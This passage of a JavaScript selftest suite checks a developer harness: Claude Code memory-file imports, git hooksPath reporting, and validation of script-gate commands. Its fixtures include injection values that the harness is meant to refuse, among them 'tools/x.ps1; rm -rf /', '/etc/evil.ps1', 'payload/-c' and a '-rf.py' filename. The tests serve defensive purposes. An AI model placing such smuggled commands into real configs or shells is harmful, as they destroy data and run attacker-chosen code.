  // Claude Code skips code spans and fenced blocks and resolves a relative import against the importing file.
  FENCE = '`'.repeat(3)
  BT = '`'
  const repoCi = newRepo('canon-import', CFG, ['api/app.py'])
  put(repoCi, 'REVIEW.md', '# invariants')
  let rCi = await gates(repoCi)
  NOT_IMPORTED = P`review canon: REVIEW\.md\s+\(NOT IMPORTED`
  check('I2 no CLAUDE.md: the canon line says NOT IMPORTED', m(rCi.Out, NOT_IMPORTED), rCi.Out)
  // Each trap below loaded nothing on host 2.1.331 (fact 250): a code span, a span over two lines, a ~~~ line
  // inside a backtick fence, and an indented code block after a blank line.
  put(repoCi, 'CLAUDE.md', L('# x', `Write ${BT}@REVIEW.md${BT} to import.`, '', `A span ${BT}starts`, `@REVIEW.md ends${BT} here.`, '',
    `${FENCE}md`, '~~~', '@REVIEW.md', FENCE, '', 'Code:', '', '    @REVIEW.md', ''))
  rCi = await gates(repoCi)
  check('I2 code spans, a span over two lines, a ~~~ line in a backtick fence and an indented block import nothing', m(rCi.Out, NOT_IMPORTED), rCi.Out)
  // A fenced block ends the paragraph before it, so an indented line right after the closing fence is code with no
  // blank line between. Mutation anchor: a closing fence that leaves the blank state alone keeps the line.
  put(repoCi, 'CLAUDE.md', L('para text', FENCE, 'code', FENCE, '    @REVIEW.md', ''))
  rCi = await gates(repoCi)
  check('I2 an indented line right after a closing fence imports nothing', m(rCi.Out, NOT_IMPORTED), rCi.Out)
  // An ATX heading, a setext underline and a thematic break at column 0 end the paragraph too (fact 256). Mutation
  // anchor: dropping any one of the three keeps its line, and the canon line says imported.
  put(repoCi, 'CLAUDE.md', L('# Head', '    @REVIEW.md', '', 'Setext', '===', '    @REVIEW.md', '', '***', '    @REVIEW.md', ''))
  rCi = await gates(repoCi)
  check('I2 an indented line right after a heading, a setext underline or a thematic break imports nothing', m(rCi.Out, NOT_IMPORTED), rCi.Out)
  // Inside a list item the closing fence is indented, and the next indented line is item text that the host loads
  // (fact 256). Mutation anchor: a closing fence that ends the paragraph at any indent drops the line.
  put(repoCi, 'CLAUDE.md', L('- item', `  ${FENCE}`, '  x', `  ${FENCE}`, '    @REVIEW.md', ''))
  rCi = await gates(repoCi)
  check('I2 an indented line after a fence inside a list item imports', m(rCi.Out, P`review canon: REVIEW\.md\s+\(imported by CLAUDE\.md\)`), rCi.Out)
  fs.rmSync(path.join(repoCi, 'CLAUDE.md'), { force: true })
  put(repoCi, 'CLAUDE.local.md', 'Mine: @REVIEW.md')
  rCi = await gates(repoCi)
  check('I2 an import in CLAUDE.local.md counts', m(rCi.Out, P`review canon: REVIEW\.md\s+\(imported by CLAUDE\.local\.md\)`), rCi.Out)
  fs.rmSync(path.join(repoCi, 'CLAUDE.local.md'), { force: true })
  if (win) {
    // Windows paths ignore case, and the probe loaded @C4.MD for c4.md there.
    put(repoCi, 'CLAUDE.local.md', 'Mine: @review.md')
    rCi = await gates(repoCi)
    check('I2 Windows: @review.md imports REVIEW.md', m(rCi.Out, P`review canon: REVIEW\.md\s+\(imported by CLAUDE\.local\.md\)`), rCi.Out)
    fs.rmSync(path.join(repoCi, 'CLAUDE.local.md'), { force: true })
  }
  put(repoCi, '.claude/CLAUDE.md', 'See @REVIEW.md here.')
  rCi = await gates(repoCi)
  check('I2 .claude/CLAUDE.md resolves @REVIEW.md to .claude/REVIEW.md, no import', m(rCi.Out, NOT_IMPORTED), rCi.Out)
  put(repoCi, '.claude/CLAUDE.md', 'See @../REVIEW.md here.')
  rCi = await gates(repoCi)
  check('I2 .claude/CLAUDE.md imports with @../REVIEW.md mid-sentence', m(rCi.Out, P`review canon: REVIEW\.md\s+\(imported by \.claude/CLAUDE\.md\)`), rCi.Out)
  put(repoCi, 'CLAUDE.md', '# x\n\n@./REVIEW.md\n')
  rCi = await gates(repoCi)
  check('I2 CLAUDE.md wins and @./REVIEW.md counts', m(rCi.Out, P`review canon: REVIEW\.md\s+\(imported by CLAUDE\.md\)`), rCi.Out)
  // A canon path with a space: Claude Code reads `@docs/my\ canon.md` as one path, and an absolute token stands as written.
  const repoCs = newRepo('canon-import-space', rep(CFG, '"canon": "REVIEW.md"', '"canon": "docs/my canon.md"'), ['api/app.py'])
  put(repoCs, 'docs/my canon.md', '# invariants')
  put(repoCs, 'CLAUDE.md', '@docs/my canon.md\n')
  let rCs = await gates(repoCs)
  check('I2 an unescaped space ends the token: NOT IMPORTED', m(rCs.Out, P`review canon: docs/my canon\.md\s+\(NOT IMPORTED`), rCs.Out)
  put(repoCs, 'CLAUDE.md', `@docs/my${BS} canon.md\n`)
  rCs = await gates(repoCs)
  check('I2 an escaped space keeps the token whole: imported', m(rCs.Out, P`review canon: docs/my canon\.md\s+\(imported by CLAUDE\.md\)`), rCs.Out)
  // Concatenated: a path join on Linux would turn the escaping backslash into a separator.
  put(repoCs, 'CLAUDE.md', `@${rep(repoCs, BS, '/')}/docs/my${BS} canon.md\n`)
  rCs = await gates(repoCs)
  check('I2 an absolute token stands as written: imported', m(rCs.Out, P`review canon: docs/my canon\.md\s+\(imported by CLAUDE\.md\)`), rCs.Out)
  // The same token through the repo's 8.3 short alias, where the volume has one: git reports the long root, and a
  // lexical compare would read the short spelling as another file (the GitHub Windows runner's TEMP is a short name).
  const csShort = shortAlias(repoCs)
  if (csShort) {
    put(repoCs, 'CLAUDE.md', `@${rep(csShort, BS, '/')}/docs/my${BS} canon.md\n`)
    rCs = await gates(repoCs)
    check('I2 an absolute token through the 8.3 short alias: imported', m(rCs.Out, P`review canon: docs/my canon\.md\s+\(imported by CLAUDE\.md\)`), rCs.Out)
  } else reg('I2 an absolute token through the 8.3 short alias: imported', { skip: 'no 8.3 short name for the fixture on this host' }, () => {})
  })
  section('I3', ['I2'], async () => {
  // --- I3: the canon is a section of a memory file (ywr-harness ADR 0217) --------------------------------
  // CLAUDE.md, .claude/CLAUDE.md and CLAUDE.local.md load at session start, so a canon in one of them needs no import.
  // The line warns when the file has no ATX heading `Review canon` outside code. An undeclared canon is CLAUDE.md, or
  // the root REVIEW.md when that file exists (the file that older scaffolds seeded), which then needs an import.
  const cmCfg = rep(CFG, '"canon": "REVIEW.md"', '"canon": "CLAUDE.md"')
  const repoCm = newRepo('canon-memory', cmCfg, ['api/app.py'])
  const cmSession = P`review canon: CLAUDE\.md\s+\(loaded at session start\)`
  let rCm = await gates(repoCm)
  check('I3 a declared memory-file canon that does not exist is NOT FOUND', m(rCm.Out, P`review canon: CLAUDE\.md\s+\(NOT FOUND`), rCm.Out)
  put(repoCm, 'CLAUDE.md', '# x\n\n## Review canon\n\n1. An invariant.\n')
  rCm = await gates(repoCm)
  check('I3 a memory-file canon with the heading needs no import: loaded at session start', m(rCm.Out, cmSession) && nm(rCm.Out, 'NO HEADING|NOT IMPORTED'), rCm.Out)
  put(repoCm, 'CLAUDE.md', '# x\n\nRules without the section.\n')
  rCm = await gates(repoCm)
  check('I3 a memory-file canon without the heading: NO HEADING, a warning on the canon line, not NOT FOUND',
    m(rCm.Out, rep(cmSession, BS + ')', ', NO HEADING')) && m(rCm.Out, "no ATX heading 'Review canon' outside code") && m(rCm.Out, 'ywr-harness ADR 0217') && nm(rCm.Out, 'NOT FOUND'), rCm.Out)
  // Code never counts: a fenced block, a ~~~ fence, an indented block, a span, a heading with no space after the hashes.
  put(repoCm, 'CLAUDE.md', L('# x', '', `${FENCE}md`, '## Review canon', FENCE, '', '~~~', '## Review canon', '~~~', '', 'Code:', '', '    ## Review canon', '',
    `A span ${BT}## Review canon${BT} here.`, '', '#Review canon', ''))
  rCm = await gates(repoCm)
  check('I3 the heading only inside code, or with no space after the hashes, is NO HEADING', m(rCm.Out, P`review canon: CLAUDE\.md\s+\(loaded at session start, NO HEADING`), rCm.Out)
  put(repoCm, 'CLAUDE.md', '# x\n\n### review CANON ###\n')
  rCm = await gates(repoCm)
  check('I3 the heading is case-insensitive, any level, with closing hashes', m(rCm.Out, cmSession) && nm(rCm.Out, 'NO HEADING'), rCm.Out)
  // A declared canon beats a root REVIEW.md: the declaration names the file, so REVIEW.md is not consulted.
  put(repoCm, 'REVIEW.md', '# legacy invariants')
  rCm = await gates(repoCm)
  check('I3 a declared CLAUDE.md canon stays the canon beside a root REVIEW.md', m(rCm.Out, cmSession), rCm.Out)
  // .claude/CLAUDE.md as the declared canon passes as a memory file.
  put(repoCm, '.claude/CLAUDE.md', '## Review canon\n')
  put(repoCm, '.harness.json', rep(CFG, '"canon": "REVIEW.md"', '"canon": ".claude/CLAUDE.md"'))
  rCm = await gates(repoCm)
  check('I3 .claude/CLAUDE.md as the declared canon passes as a memory file', m(rCm.Out, P`review canon: \.claude/CLAUDE\.md\s+\(loaded at session start\)`), rCm.Out)
  // An undeclared canon: the root REVIEW.md when it exists, and then it needs an import like any other file.
  put(repoCm, '.harness.json', CFG.replace(/"canon": "REVIEW.md",\s*/u, ''))
  rCm = await gates(repoCm)
  check('I3 an undeclared canon beside a root REVIEW.md is REVIEW.md, NOT IMPORTED', m(rCm.Out, NOT_IMPORTED) && m(rCm.Out, 'ywr-harness ADR 0217'), rCm.Out)
  put(repoCm, 'CLAUDE.md', '# x\n\n@REVIEW.md\n')
  rCm = await gates(repoCm)
  check('I3 an undeclared canon that resolves to REVIEW.md passes through its import', m(rCm.Out, P`review canon: REVIEW\.md\s+\(imported by CLAUDE\.md\)`), rCm.Out)
  fs.rmSync(path.join(repoCm, 'REVIEW.md'), { force: true })
  put(repoCm, 'CLAUDE.md', '## Review canon\n')
  rCm = await gates(repoCm)
  check('I3 an undeclared canon and no REVIEW.md: the default is CLAUDE.md, loaded at session start', m(rCm.Out, cmSession), rCm.Out)
  })
  section('J', ['A', 'I'], async () => {
  // --- J: non-ASCII output survives a hostile console codepage ------------------------------------
  // Node writes UTF-8 to a pipe whatever PYTHONIOENCODING says, so the variable set below does not reach a
  // subject: the case checks that non-ASCII output arrives intact, not a codepage defence.
  const rJ = await gates(repoA, [], { child: true, env: { PYTHONIOENCODING: 'cp1252' } })
  g('J separator survives an inherited cp1252 encoding', m(rJ.Out, '·'), rJ.Out)
  g('J tier reason em dash survives', m(rJ.Out, P`review tier: \w+ — `), rJ.Out)
  })
  section('K', [], async () => {
  // --- K: the hooks drift report (ADR 0015) -------------------------------------------------------
  // core.hooksPath is per-clone and never committed, so a repo can carry .githooks/ while THIS clone
  // runs none of it. Without this line the two states are indistinguishable, which is the whole reason
  // the conditional wiring in init.mjs is not sufficient on its own.
  repoK = newRepo('hooks-report', CFG, ['api/app.py'])
  const rK0 = await gates(repoK)
  check('K0 no .githooks/ means no hooks line at all', nm(rK0.Out, 'hooks:'), rK0.Out)

  put(repoK, '.githooks/pre-commit', '#!/bin/sh')
  const rK1 = await gates(repoK)
  check('K1 unwired clone is reported', m(rK1.Out, P`hooks: .*core\.hooksPath is UNSET`), rK1.Out)
  check('K1 the fix is spelled out', m(rK1.Out, P`git config core\.hooksPath \.githooks`), rK1.Out)
  check('K1 still advisory (exit 0)', rK1.Code === 0, `exit=${rK1.Code}`)

  gitq(repoK, ['config', '--local', 'core.hooksPath', '.githooks'])
  rK2 = await gates(repoK)
  check('K2 wired clone says so', m(rK2.Out, P`hooks: \.githooks/ wired`), rK2.Out)
  check('K2 wired clone stops nagging', nm(rK2.Out, 'UNSET'), rK2.Out)

  gitq(repoK, ['config', '--local', 'core.hooksPath', '.elsewhere'])
  const rK3 = await gates(repoK)
  check('K3 a foreign hooksPath is reported, not called wired', m(rK3.Out, P`points at '\.elsewhere'`), rK3.Out)
  })
  section('K6', ['K'], async () => {
  // K6: the SAME directory in any other spelling is wired, not foreign. A literal compare against
  // '.githooks' would report an absolute value, a './' prefix and the Git-Bash-on-Windows MSYS form as
  // "the harness hooks do not run in this clone" while they run.
  const absHooks = path.join(repoK, '.githooks')
  gitq(repoK, ['config', '--local', 'core.hooksPath', absHooks])
  const rK6 = await gates(repoK)
  check('K6 absolute hooksPath to .githooks is wired', m(rK6.Out, P`hooks: \.githooks/ wired`) && nm(rK6.Out, 'do not run'), rK6.Out)
  gitq(repoK, ['config', '--local', 'core.hooksPath', './.githooks'])
  const rK6b = await gates(repoK)
  check('K6b ./.githooks is wired', m(rK6b.Out, P`hooks: \.githooks/ wired`), rK6b.Out)
  const drive = /^([A-Za-z]):\\(.*)$/u.exec(absHooks)
  if (win && drive) {
    const msys = `/${drive[1].toLowerCase()}/${rep(drive[2], BS, '/')}`
    gitq(repoK, ['config', '--local', 'core.hooksPath', msys])
    const rK6c = await gates(repoK)
    check('K6c MSYS /c/... form is wired on Windows', m(rK6c.Out, P`hooks: \.githooks/ wired`), rK6c.Out)
  }
  })
  section('K6e', ['K', 'K6'], async () => {
  // K6e: git expands `~/` in a pathname variable when it RUNS hooks, but `git config --get` returns the
  // raw text — the emitter must read the value the way git applies it (`--path`), or a tilde-wired
  // clone stays foreign. HOME is pinned to the fixture itself so `~/.githooks`
  // resolves there on every platform (git prefers HOME over USERPROFILE on Windows too). The value is
  // written through an argv array, so no shell expands the tilde before git sees it.
  gitq(repoK, ['config', '--local', 'core.hooksPath', '~/.githooks'], { HOME: repoK })
  const rK6e = await gates(repoK, [], { env: { HOME: repoK } })
  check('K6e a ~/ hooksPath (git tilde expansion) is wired', m(rK6e.Out, P`hooks: \.githooks/ wired`), rK6e.Out)
  gitq(repoK, ['config', '--local', 'core.hooksPath', path.join(repoK, '.other-hooks')])
  const rK6d = await gates(repoK)
  check('K6d an absolute path to a DIFFERENT dir stays foreign', m(rK6d.Out, 'do not run in this clone'), rK6d.Out)
  })
  section('K6f', [], async () => {
  // K6f: `.githooks` reached THROUGH a link (an NTFS junction on Windows — a symlink needs admin there;
  // a symlink on POSIX) with core.hooksPath written as the REAL target. `resolve()` follows the link, so
  // this is wired — pinned here because the scaffold's compare (init.mjs testHooksPathNames) follows
  // THIS rule: a lexical compare would say REFUSED for the same state, and a regression on either side
  // breaks the parity. SKIP is reported when the link cannot be made.
  const repoK6f = newRepo('hooks-linked', CFG, ['api/app.py'])
  const k6fReal = path.join(fx, 'hooks-linked-real')
  put(k6fReal, 'pre-commit', '#!/bin/sh')
  const k6fType = win ? 'Junction' : 'SymbolicLink'
  let k6fWhy = null
  try { fs.symlinkSync(k6fReal, path.join(repoK6f, '.githooks'), win ? 'junction' : 'dir') } catch (e) { k6fWhy = String(e.message).split('\n')[0] }
  if (k6fWhy === null) {
    gitq(repoK6f, ['config', '--local', 'core.hooksPath', k6fReal])
    const rK6f = await gates(repoK6f)
    check('K6f the REAL target of a linked .githooks is wired (resolve() follows the link)', m(rK6f.Out, P`hooks: \.githooks/ wired`) && nm(rK6f.Out, 'do not run'), rK6f.Out)
  } else {
    reg('K6f linked .githooks', { skip: `cannot create a ${k6fType} here (reported, not silent): ${k6fWhy}` }, () => {})
  }
  })
  section('K7', ['K', 'K6', 'K6e'], async () => {
  // K7: a WORKTREE-scoped core.hooksPath (`extensions.worktreeConfig`) outranks `.git/config`. The
  // `--local` read alone would call this clone wired while git runs hooks from `.elsewhere`.
  // K7b: the worktree value naming `.githooks` is wired, and says the scope.
  gitq(repoK, ['config', '--local', 'core.hooksPath', '.githooks'])
  gitq(repoK, ['config', 'extensions.worktreeConfig', 'true'])
  gitq(repoK, ['config', '--worktree', 'core.hooksPath', '.elsewhere'])
  const rK7 = await gates(repoK)
  check('K7 a foreign WORKTREE-scoped value outranks a wired local one — reported, never called wired',
    m(rK7.Out, 'WORKTREE scope') && m(rK7.Out, 'do not run in this worktree') && nm(rK7.Out, P`hooks: \.githooks/ wired`), rK7.Out)
  gitq(repoK, ['config', '--worktree', 'core.hooksPath', path.join(repoK, '.githooks')])
  const rK7b = await gates(repoK)
  check('K7b a worktree-scoped value naming .githooks is wired, scope named', m(rK7b.Out, P`hooks: \.githooks/ wired \(core\.hooksPath at worktree scope\)`), rK7b.Out)
  gitq(repoK, ['config', '--worktree', '--unset', 'core.hooksPath'])
  gitq(repoK, ['config', '--unset', 'extensions.worktreeConfig'])
  gitq(repoK, ['config', '--local', 'core.hooksPath', '.elsewhere'])

  // The hook's output parser stops at `review tier:`; if the hooks line ever moved above it, a
  // scaffolded repo would try to execute it as a gate command.
  const k2Parts = rK2.Out.split(/review tier:/iu)
  check('K4 hooks line stays below the tier line', k2Parts.length === 2 && m(k2Parts[1], 'hooks:'), rK2.Out)
  })
  section('K5', ['K', 'K6', 'K6e', 'K7'], async () => {
  // K5: the executable bit is the SECOND per-checkout axis of the same gap (ADR 0056): a
  // Windows-scaffolded repo commits hooks at mode 100644 and a POSIX clone silently skips them.
  // POSIX-gated — Windows git invokes hooks through sh regardless of the bit, and the mode of a
  // file written here IS the checkout state under test; CI's ubuntu selftest is the measurement.
  if (win) {
    reg('K5 exec bit', { skip: 'Windows — git invokes hooks through sh regardless of the mode bit; CI ubuntu runs this case' }, () => {})
  } else {
    gitq(repoK, ['config', '--local', 'core.hooksPath', '.githooks'])
    const rK5 = await gates(repoK)
    check('K5 a non-executable hook is reported with both remedies',
      m(rK5.Out, P`NOT executable \(pre-commit\)`) && m(rK5.Out, P`chmod \+x \.githooks/\*`) && m(rK5.Out, P`git update-index --chmod=\+x \.githooks/\*`), rK5.Out)
    check('K5 still advisory (exit 0)', rK5.Code === 0, `exit=${rK5.Code}`)
    fs.chmodSync(path.join(repoK, '.githooks/pre-commit'), 0o755)
    const rK5b = await gates(repoK)
    check('K5b an executable hook stops the report (wired line stays)', nm(rK5b.Out, 'NOT executable') && m(rK5b.Out, P`hooks: \.githooks/ wired`), rK5b.Out)
    // K5c: the foreign-hooksPath branch OMITS the exec-bit report — git is not consulting
    // .githooks/ there, so a chmod remedy would read as a fix that fixes nothing; the only
    // honest remedy on that branch is the hooksPath one.
    put(repoK, '.githooks/pre-push', '#!/bin/sh')
    gitq(repoK, ['config', '--local', 'core.hooksPath', '.elsewhere'])
    const rK5c = await gates(repoK)
    check('K5c foreign hooksPath drops the exec-bit note (bit is irrelevant there)', m(rK5c.Out, P`points at '\.elsewhere'`) && nm(rK5c.Out, 'NOT executable'), rK5c.Out)
  }
  })
  section('L', [], async () => {
  // --- L: script gates (ADR 0024) — closed-set runner + validated repo path ----------------------
  const CFG_SCRIPT = P`{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "ps", "match": "^tools/.*\\.ps1$", "cwd": "", "strip_prefix": "",
      "gates": [ { "runner": "pwsh", "script": "tools/selftest.ps1", "files": false } ] },
    { "name": "py", "match": "^pysrc/.*\\.py$", "cwd": "pysrc", "strip_prefix": "pysrc/",
      "gates": [ { "runner": "python", "script": "pysrc/gate.py", "files": true } ] }
  ]
}`
  const repoL = newRepo('script-gate', CFG_SCRIPT, ['tools/selftest.ps1', 'pysrc/gate.py', 'pysrc/app.py'])
  const rL = await gates(repoL)
  g('L whole-program script gate composes runner template + path', m(rL.Out, P`pwsh -NoProfile -File tools/selftest\.ps1\s+# whole-program`), rL.Out)
  g('L file-scoped script gate appends files, strip_prefix on script AND files', m(rL.Out, P`cd pysrc && python gate\.py app\.py gate\.py`), rL.Out)
  g('L an existing script draws no missing-path warning', nm(rL.Out, 'does not exist'), rL.Out)
  })
  section('M', [], async () => {
  // --- M: script-gate validation — refused values are echoed but never composed -------------------
  const CFG_BAD_SCRIPT = P`{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "ps", "match": "^tools/", "cwd": "", "strip_prefix": "", "gates": [
      { "runner": "bash", "script": "tools/ok.ps1" },
      { "runner": "pwsh", "script": "tools/x.ps1; rm -rf /" },
      { "runner": "pwsh", "script": "/etc/evil.ps1" },
      { "runner": "pwsh", "script": "../outside.ps1" },
      { "runner": "pwsh", "script": "-oops.ps1" },
      { "runner": "pwsh", "script": "tools/*.ps1" },
      { "runner": "pwsh", "script": "tools/none.ps1" },
      { "runner": "pwsh", "script": "tools/ok.ps1" }
    ] }
  ]
}`
  const repoM = newRepo('script-gate-bad', CFG_BAD_SCRIPT, ['tools/ok.ps1'])
  const rM = await gates(repoM)
  // Emitted commands only — the warnings legitimately echo every refused value (same split as case B).
  const mRun = cmdLines(rM.Out)
  g('M runner outside the closed set is dropped and the set named', m(rM.Out, "script-gate runner 'bash' is not in the closed set") && m(rM.Out, 'python-uv'), rM.Out)
  g('M a metacharacter path is refused and echoed in the warning', m(rM.Out, 'rm -rf'), rM.Out)
  g('M no refused value reaches an emitted command', !anyLine(mRun, P`rm -rf|/etc/evil|\.\./outside|bash`), `lines: ${mRun.join(' | ')}`)
  g('M an absolute path is refused', m(rM.Out, P`'/etc/evil\.ps1' refused`), rM.Out)
  g("M a '..' path is refused", m(rM.Out, P`'\.\./outside\.ps1' refused`), rM.Out)
  g('M a leading-dash path is refused (a value in command position parsed as an option — case I2 class)', m(rM.Out, P`'-oops\.ps1' refused`), rM.Out)
  g('M a glob path is refused (CI runs sh -c without set -f)', m(rM.Out, P`'tools/\*\.ps1' refused`), rM.Out)
  g('M a missing script warns but the command still emits (typo must not read as coverage)', m(rM.Out, P`'tools/none\.ps1' does not exist`) && m(rM.Out, P`pwsh -NoProfile -File tools/none\.ps1`), rM.Out)
  g('M the valid script gate still emits', anyLine(mRun, P`pwsh -NoProfile -File tools/ok\.ps1`), `lines: ${mRun.join(' | ')}`)
  })
  section('N', [], async () => {
  // --- N: an identical composed command emits once, deduplicated visibly --------------------------
  // A whole-program script gate declared on several groups would otherwise run once per group in CI.
  const CFG_DUP = P`{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "a", "match": "^a/", "cwd": "", "strip_prefix": "",
      "gates": [ { "runner": "pwsh", "script": "tools/all.ps1", "files": false } ] },
    { "name": "b", "match": "^b/", "cwd": "", "strip_prefix": "",
      "gates": [ { "runner": "pwsh", "script": "tools/all.ps1", "files": false } ] }
  ]
}`
  const repoN = newRepo('script-gate-dup', CFG_DUP, ['a/x.txt', 'b/y.txt', 'tools/all.ps1'])
  const rN = await gates(repoN)
  const nEmit = cmdLines(rN.Out, false).filter((l) => m(l, P`tools/all\.ps1`))
  g('N the duplicate command emits exactly once', nEmit.length === 1, `emitted ${nEmit.length}x: ${nEmit.join(' | ')}`)
  g('N the dedupe is visible, not silent', m(rN.Out, P`already emitted above — deduplicated`), rN.Out)
  g('N the dedupe note is parenthesized so both output parsers skip it', m(rN.Out, P`\n    \(already emitted above`), rN.Out)
  })
  section('N2', [], async () => {
  // N2: the SAME dedupe through a closed-set SELECTOR gate. Same code path as N (`cmd in seen`
  // keys on the composed string), but N proves it for script gates only, and a shared code path is an
  // assumption until a case pins it.
  const CFG_DUP2 = P`{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "a", "match": "^a/", "cwd": "", "strip_prefix": "", "gates": ["pytest"] },
    { "name": "b", "match": "^b/", "cwd": "", "strip_prefix": "", "gates": ["pytest"] }
  ]
}`
  const repoN2 = newRepo('selector-gate-dup', CFG_DUP2, ['a/x.txt', 'b/y.txt'])
  const rN2 = await gates(repoN2)
  const n2Emit = cmdLines(rN2.Out, false).filter((l) => m(l, 'uv run pytest -q'))
  check('N2 an identical selector-gate command emits exactly once', n2Emit.length === 1, `emitted ${n2Emit.length}x: ${n2Emit.join(' | ')}`)
  check('N2 the selector dedupe is visible, not silent', m(rN2.Out, P`\n    \(already emitted above — deduplicated: uv run pytest -q`), rN2.Out)
  })
  section('O', [], async () => {
  // --- O: THE strip_prefix ESCAPE — validation must run on the token that becomes argv -----------
  // Cases L and M cannot see it: L strips a prefix off an ordinary filename, M refuses a leading dash
  // only with strip_prefix EMPTY. Combined, a declared path that passes validation composes to a bare
  // interpreter flag — and with files:true the next argv token is a changed FILENAME, which
  // `python -c` / `node -e` execute as source. Both consumers run emitted commands through `sh -c`.
  const CFG_ESCAPE = P`{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "evil", "match": "^payload/", "cwd": "", "strip_prefix": "payload/",
      "gates": [ { "runner": "python", "script": "payload/-c", "files": true } ] },
    { "name": "evil2", "match": "^pysrc/", "cwd": "", "strip_prefix": "pysrc/",
      "gates": [ { "runner": "node", "script": "pysrc/-e", "files": true } ] }
  ]
}`
  const repoO = newRepo('strip-escape', CFG_ESCAPE, ['payload/harmless.py', 'pysrc/harmless.js'])
  const rO = await gates(repoO)
  const oRun = cmdLines(rO.Out)
  g('O a path that composes to a bare flag under strip_prefix is REFUSED', m(rO.Out, "under strip_prefix 'payload/' it composes to '-c'"), rO.Out)
  g('O the refusal explains the option-injection reason', m(rO.Out, 'read as an option to the runner'), rO.Out)
  g('O node -e is refused the same way', m(rO.Out, "composes to '-e'"), rO.Out)
  g('O NO emitted command contains a bare interpreter flag', !anyLine(oRun, P`(python|node)\s+-[ce](\s|$)`), `lines: ${oRun.join(' | ')}`)
  g('O the refused gates emit nothing at all, and the none-line names the refusal cause', m(rO.Out, 'no declared group matched, matched groups declare no gates, or every declared gate was refused or skipped'), rO.Out)
  })
  section('P', [], async () => {
  // --- P: a changed FILENAME is repo-supplied text too --------------------------------------------
  // A file whose name carries a leading dash is neutralized (./-name) rather than handed over as an
  // option; one carrying sh metacharacters cannot be an argument at all, so it is EXCLUDED and the
  // coverage loss is stated. `sh -c` re-splits, and both output parsers truncate at '#'.
  CFG_FILES = P`{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "py", "match": "^src/", "cwd": "", "strip_prefix": "src/", "gates": ["ruff"] }
  ]
}`
  const repoP = newRepo('hostile-filenames', CFG_FILES, ['src/-rf.py', 'src/ok.py'])
  // Names git tracks happily and `sh -c` would re-split or truncate. Created here rather than in
  // newRepo's list so the awkward characters never pass through a path-join round trip.
  put(repoP, 'src/a b.py')
  put(repoP, 'src/c#d.py')
  const rP = await gates(repoP)
  const pRun = cmdLines(rP.Out)
  g('P a leading-dash filename is neutralized with ./, never passed bare', anyLine(pRun, P`\./-rf\.py`) && !anyLine(pRun, P`(check|ruff)\s+-rf\.py`), `lines: ${pRun.join(' | ')}`)
  g('P a filename with a space is excluded from the arguments', !anyLine(pRun, P`a b\.py`), `lines: ${pRun.join(' | ')}`)
  g('P a filename with # is excluded (both parsers truncate at #)', !anyLine(pRun, P`c#d\.py`), `lines: ${pRun.join(' | ')}`)
  g('P the exclusion is reported as an ungated coverage loss', m(rP.Out, "EXCLUDED from this group's gate arguments") && m(rP.Out, 'are UNGATED'), rP.Out)
  g('P each excluded file is named', m(rP.Out, P`excluded: src/a b\.py`) && m(rP.Out, P`excluded: src/c#d\.py`), rP.Out)
  g('P the exclusion lines are parenthesized so neither parser runs them', lines(rP.Out).filter((l) => m(l, 'excluded:')).filter((l) => nm(l, P`^\s*\(|^\s{4}\(`)).length === 0, rP.Out)
  g('P the safe file is still gated', anyLine(pRun, P`uv run ruff check.*ok\.py`), `lines: ${pRun.join(' | ')}`)
  // '..' is traversal only as a path SEGMENT. A file honestly named a..b.py must stay gated —
  // a substring rule here would silently ungate real files to guard against nothing.
  put(repoP, 'src/a..b.py')
  const rP2 = await gates(repoP)
  const p2Run = cmdLines(rP2.Out)
  check('P2 a dotted filename is not mistaken for traversal', anyLine(p2Run, P`a\.\.b\.py`), `lines: ${p2Run.join(' | ')}`)
  check('P2 it is not reported as excluded either', nm(rP2.Out, P`excluded: src/a\.\.b\.py`), rP2.Out)
  })
  section('P3', [], async () => {
  // P3: the same exclusion in a group that ALSO declares a whole-program gate. "UNGATED" would overstate
  // it there: the whole-program gate runs regardless of the argument
  // list, so only the FILE-SCOPED coverage is lost — the claim must match what actually runs.
  // Case P stays the control: its group is scoped-only, so the unqualified wording still holds.
  const CFG_MIXED = P`{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "py", "match": "^src/", "cwd": "", "strip_prefix": "src/", "gates": ["ruff", "pytest-nondb"] }
  ]
}`
  const repoP3 = newRepo('excluded-but-whole-covered', CFG_MIXED, ['src/ok.py'])
  put(repoP3, 'src/a b.py')
  const rP3 = await gates(repoP3)
  check('P3 with a whole-program gate present the exclusion is NOT called UNGATED', nm(rP3.Out, 'are UNGATED'), rP3.Out)
  check('P3 the note says the whole-program gate still covers the excluded file', m(rP3.Out, 'whole-program gate still covers them'), rP3.Out)
  check('P3 the warn names the real loss — file-scoped coverage only', m(rP3.Out, P`could not be\s+passed as file-scoped gate arguments`) && m(rP3.Out, 'rename them to restore file-scoped coverage'), rP3.Out)
  check('P3 the excluded file is still named', m(rP3.Out, P`excluded: src/a b\.py`), rP3.Out)
  check('P3 the whole-program gate actually emits (the claim rests on it running)', m(rP3.Out, P`uv run pytest -m 'not db' -q`), rP3.Out)
  })
  section('P4', [], async () => {
  // --- P4: `( ) [ ]` are admitted as FILE arguments, single-quoted; a deleted file is never one ----
  // ADR 0112: Next.js route groups `(admin)` and dynamic segments `[id]`. The four
  // characters are shlex-unsafe, so compose() quotes them. The deleted `[id]` sibling is the
  // hazard: eslint/prettier read a MISSING `[x]` path as a glob and check `x`'s sibling instead — so
  // a deletion is dropped and said, never passed. `$`, `{`, `@`, `+` stay excluded (option C).
  CFG_ROUTES = P`{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "web", "match": "^src/", "cwd": "", "strip_prefix": "src/", "gates": ["eslint"] },
    { "name": "gone", "match": "^old/", "cwd": "", "strip_prefix": "old/", "gates": ["eslint", "tsc"] }
  ]
}`
  const repoP4 = newRepo('route-paths', CFG_ROUTES, ['src/app/(admin)/page.ts', 'src/app/[id]/page.ts', 'src/app/[id]/gone.ts', 'old/[x]/a.ts'])
